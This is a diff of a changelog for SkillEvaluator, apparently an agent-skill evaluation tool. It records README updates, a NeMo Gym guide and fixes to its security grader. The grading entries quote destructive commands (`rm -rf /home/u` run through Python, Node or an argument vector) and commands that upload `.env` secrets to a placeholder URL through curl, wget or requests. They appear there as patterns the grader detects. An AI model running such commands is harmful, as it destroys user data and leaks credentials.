@@ -9,9 +9,28 @@ All notable changes to SkillEvaluator are documented in this file.
 - Add a README badge linking to the reusable GitHub and GitLab CI templates,
   and explain how to add automated quality and security gates to a skills
   repository without maintaining evaluation code.
+- Expand repository CI onboarding in the README, linked from the Get started
+  table, with guided setup, current GitHub and GitLab templates, and their
+  validation and security coverage. Highlight the verified 500+ static rules
+  and detection patterns behind the CI check groups. Use `validate --tiers 1`
+  and scanner setup in the CLI getting-started card, with the all-tier command
+  in a collapsible section.
+- Simplify the README Harness Check introduction with key-free and agent-free
+  callouts now that the supporting 1.0.1 package is published.
+- Describe the other Tier 1 checks alongside Harness Check in the README and
+  include `harness` in the reference page's default check list.
+
+### Added
+
+- A dedicated [NeMo Gym integration guide](https://docs.nvidia.com/skills/skillevaluator/nemo-gym)
+  with setup, reviewed-dataset evaluation, reports, and troubleshooting.
 
 ### Fixed
 
+- Scanner install hints in `health-check` and `doctor` now match the host:
+  Windows suggests `winget install Gitleaks.Gitleaks` and `uv tool install semgrep`
+  instead of `brew`, macOS keeps `brew`, and Linux suggests `go install` or a
+  release binary.
 - Malformed optional trajectory `final_metrics` leave condition usage unavailable
   and no longer abort fresh or reused Tier 3 result collection.
 - Trajectories rebuilt from native Codex logs preserve recorded MCP server and
@@ -25,10 +44,37 @@ All notable changes to SkillEvaluator are documented in this file.
   candidates also use `mcp__server__tool` labels. Harbor-provided Codex
   trajectories and their existing MCP classification are unchanged.
 
+- Rebuilding validation results after severity overrides or scanner finding
+  deduplication no longer repeatedly scans accumulated independent diagnostics;
+  diagnostic order, duplicate-warning options and summary counts are preserved.
 - Allow GitHub all-tier CI to opt out of deployment records while retaining
   environment secrets. Existing consumers keep deployment tracking by default.
 - Point the PyPI Documentation link at the NVIDIA documentation instead of the GitHub
   README, starting with the next release. Published 1.0.1 metadata is unchanged.
+- Tier 3 security grading now gives a destructive-command finding for a
+  recursive `rm` that Python or Node code runs from a literal argument
+  vector, as in
+  `python3 -c "import subprocess; subprocess.run(['rm', '-rf', '/home/u'])"`,
+  `spawnSync('rm', ['-rf', '/home/u'])` or an execution tool's `code`
+  argument, and for an argument-vector command such as
+  `["rm", "-rf", "/workspace"]`; these scored Security `1.0` in 1.0.1. The
+  vector is checked as the shell command it names, from where the interpreter
+  starts, so a `/tmp` target, a force-only `rm -f` of a file outside system
+  and home paths, and a cache or trial output cleanup still score `1.0`. The
+  Tier 3 guide lists the forms that are not read. Python code nested too deep
+  to parse no longer stops the check on Python 3.12 and later. Both the host
+  checker and the bundled Harbor verifier apply the fix.
+- Tier 3 security grading now warns about network exfiltration (Security
+  `0.5`) for HTTP uploads by interpreter code a call runs, as in
+  `python3 -c "import requests; requests.post(URL, data=d)"`, `node -e` with
+  `fetch` and a `POST` method, or `subprocess.run(["curl", "-d", "@.env", URL])`,
+  and through `xh`, `wget -e post_file=.env`, or a curl `-K` config or
+  `.wgetrc` the same call writes, which scored `1.0` before this change.
+  Routes, test clients, mocks and code that is only written do not warn; a
+  call whose reading spends its work budget does, reported as an incomplete
+  inspection rather than observed unsafe behavior. The Tier 3 guide lists the
+  forms that are not read. Both the host checker and the bundled Harbor
+  verifier apply the fix.
 
 ## 1.0.1 - 2026-11-17
 
@@ -122,9 +168,9 @@ must be updated when the release is frozen.
 - Add offline pre-commit hooks: `skillevaluator-quality`,
   `skillevaluator-schema`, and `skillevaluator-lint-scripts`. These hooks need
   no API key, Docker, network access, or scanner downloads.
-- Add the experimental `tier3 evaluate --backend nemo-gym` adapter, with shared
-  evaluation cases, verifier results, and report formats. Harbor remains the
-  default backend. JSON and HTML identify the backend used.
+- 🎯 **NeMo Gym integration:** run Tier 3 evaluations through NeMo Gym with
+  SkillEvaluator’s grading and reports. [Get started](https://docs.nvidia.com/skills/skillevaluator/nemo-gym).
+  The integration is experimental; Harbor remains the default backend.
 - Add opt-in grader qualification coverage policies, risk limits, preflight
   checks, and retained assessment evidence. These tools and the synthetic pilot
   do not establish grader reliability or release qualification.
